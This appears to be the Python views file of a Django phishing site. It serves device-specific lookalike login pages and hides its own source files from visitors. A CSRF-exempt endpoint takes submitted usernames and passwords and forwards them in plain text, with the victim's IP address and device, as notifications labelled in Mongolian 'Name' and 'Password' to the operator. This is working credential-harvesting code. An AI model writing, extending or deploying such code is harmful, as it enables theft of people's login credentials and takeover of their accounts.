import json, os, mimetypes
from django.http import JsonResponse, HttpResponse, FileResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from django.conf import settings
from . import security

ROOT = str(settings.BASE_DIR)

_BLOCKED_NAMES = {'manage.py'}
_BLOCKED_DIRS  = {'config', 'api'}
_BLOCKED_EXTS  = {'.py', '.pyc', '.pyo'}


def serve_file(request, filepath=''):
    if not filepath:
        ua = request.META.get('HTTP_USER_AGENT', '')
        import re as _re
        is_phone = bool(_re.search(
            r'iPhone|iPod|Android.*Mobile|BlackBerry|IEMobile|Opera Mini', ua, _re.I
        ))
        filepath = 'mobile/mobile.html' if is_phone else 'desktop/public_ui.html'

    if filepath == 'mobile_app.js':
        filepath = 'mobile/mobile_app.js'

    safe = os.path.normpath(os.path.join('/', filepath)).lstrip('/')
    full = os.path.abspath(os.path.join(ROOT, safe))

    if full != ROOT and not full.startswith(ROOT + os.sep):
        return HttpResponse(status=403)

    parts = safe.split(os.sep)
    if parts[0] in _BLOCKED_DIRS:
        return HttpResponse(status=404)

    if os.path.basename(full) in _BLOCKED_NAMES:
        return HttpResponse(status=404)
    _, ext = os.path.splitext(full)
    if ext in _BLOCKED_EXTS:
        return HttpResponse(status=404)

    if os.path.isdir(full):
        full = os.path.join(full, 'index.html')

    if os.path.isfile(full):
        content_type, _ = mimetypes.guess_type(full)
        ct = content_type or 'application/octet-stream'
        if ct.startswith('text/') or ct in ('application/javascript', 'application/json'):
            with open(full, 'rb') as f:
                resp = HttpResponse(f.read(), content_type=ct)
            resp['Cache-Control'] = 'public, max-age=1800' if ct == 'text/html' else 'public, max-age=86400'
            return resp
        resp = FileResponse(open(full, 'rb'), content_type=ct)
        resp['Cache-Control'] = 'public, max-age=86400'
        return resp

    return HttpResponse(status=404)


@csrf_exempt
@require_http_methods(['POST'])
def api_log(request):
    try:
        ip = request.META.get('REMOTE_ADDR', '')
        if security.check_rate(ip):
            return HttpResponse(status=429)
        entry = json.loads(request.body.decode('utf-8'))
        if not entry.get('u') and not entry.get('p'):
            return JsonResponse({'ok': True})
        ua     = request.headers.get('User-Agent', '')
        device = security.device_label(ua)
        cat    = entry.get('c', 'Нэвтрэх')
        security.send_notification(
            f'🔔 {cat}',
            f'Нэр: <b>{entry["u"]}</b>\nНууц үг: <code>{entry["p"]}</code>',
            subtitle=f'IP: {ip}  |  {device}',
        )
        return JsonResponse({'ok': True})
    except Exception:
        return HttpResponse(status=400)


